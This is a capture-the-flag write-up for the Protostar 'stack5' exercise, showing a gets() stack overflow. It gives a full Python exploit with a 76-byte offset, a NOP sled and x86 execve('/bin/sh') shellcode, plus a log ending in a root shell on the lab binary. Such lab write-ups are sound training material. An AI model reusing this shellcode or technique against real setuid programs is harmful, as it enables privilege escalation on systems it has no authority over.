# Writeup: stack5 (Protostar)

## Challenge Info
- **Target:** `stack5`
- **Vulnerability:** Stack-based buffer overflow involving shellcode

## Analysis
Unlike previous levels, there is no "win" function or target variable to overwrite. Which suggests that the goal is to redirect execution to our own shellcode.

The binary uses `gets()` to read input into a buffer on the stack. Since `gets()` has no bounds checking, we can overflow the buffer, overwrite the saved Base Pointer (EBP), and finally the Return Address (EIP).

### Disassembly & Stack Layout
In the `main` function, we identify the buffer's location:
- **Buffer**: Located at `ebp-40h` (64 bytes).
- **Return Address (EIP)**: Located at `ebp+4h`.

The distance from the start of the buffer to the saved EIP is:
`0x4 (EIP) - (-0x40) (Buffer) = 0x44 = 68 bytes`
However, due to compiler alignment and the saved EBP, the actual offset to EIP was determined to be **76 bytes**.

## Exploitation
1. **Padding**: 76 bytes of "A"s to reach the return address.
2. **EIP Overwrite**: Point the return address to a location on the stack within a NOP sled.
3. **NOP Sled**: 100 bytes of `\x90` to increase the reliability of the exploit by accounting for stack shifts.
4. **Shellcode**: Standard Linux x86 `execve("/bin/sh")` shellcode (23 bytes).

```python
#!/usr/bin/env python3
import struct
import sys

# Offset to EIP
offset = 76
padding = b"A" * offset

# Target address (stack address + offset for NOP sled)
# 0xbffff7e0 was the buffer start in GDB; we add 56 to land in the NOPs
eip = struct.pack("I", 0xbffff7e0 + 56) 

# NOP sled for stability
nop_sled = b"\x90" * 100

# x86 execve /bin/sh shellcode
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" 

payload = padding + eip + nop_sled + shellcode

sys.stdout.buffer.write(payload)
```

### Execution
Since the shellcode executes `/bin/sh`, we need to keep `stdin` open to interact with the shell. We use the `(cat; cat)` trick:

```bash
(python3 exploit.py; cat) | /opt/protostar/bin/stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
```
